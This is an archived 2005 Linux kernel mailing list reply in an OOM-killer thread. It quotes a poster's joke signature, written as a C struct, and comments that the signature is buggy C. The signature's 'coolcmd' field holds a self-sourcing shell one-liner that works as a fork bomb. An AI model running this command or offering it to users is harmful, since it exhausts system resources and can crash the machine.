Return-Path: <linux-kernel-owner+willy=40w.ods.org-S965044AbVHJINm@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S965044AbVHJINm (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 10 Aug 2005 04:13:42 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S965045AbVHJINm
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 10 Aug 2005 04:13:42 -0400
Received: from 167.imtp.Ilyichevsk.Odessa.UA ([195.66.192.167]:19106 "HELO
	port.imtp.ilyichevsk.odessa.ua") by vger.kernel.org with SMTP
	id S965044AbVHJINl (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 10 Aug 2005 04:13:41 -0400
From: Denis Vlasenko <vda@ilport.com.ua>
To: Thomas Habets <thomas@habets.pp.se>, Xavier Roche <roche+kml2@exalead.com>
Subject: Re: [PATCH] Kernels Out Of Memoy(OOM) killer Problem ?
Date: Wed, 10 Aug 2005 11:13:23 +0300
User-Agent: KMail/1.5.4
Cc: linux-kernel@vger.kernel.org, vinays@burntmail.com
References: <42F8720D.4060300@picsearch.com> <200508091133.21837.thomas@habets.pp.se>
In-Reply-To: <200508091133.21837.thomas@habets.pp.se>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="koi8-r"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200508101113.23490.vda@ilport.com.ua>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Tuesday 09 August 2005 12:33, Thomas Habets wrote:
> ---------
> typedef struct me_s {
>   char name[]      = { "Thomas Habets" };
>   char email[]     = { "thomas@habets.pp.se" };
>   char kernel[]    = { "Linux" };
>   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
>   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
>   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
> } me_t;

Your sig is very very buggy (if interpreted as C code).
--
vda 

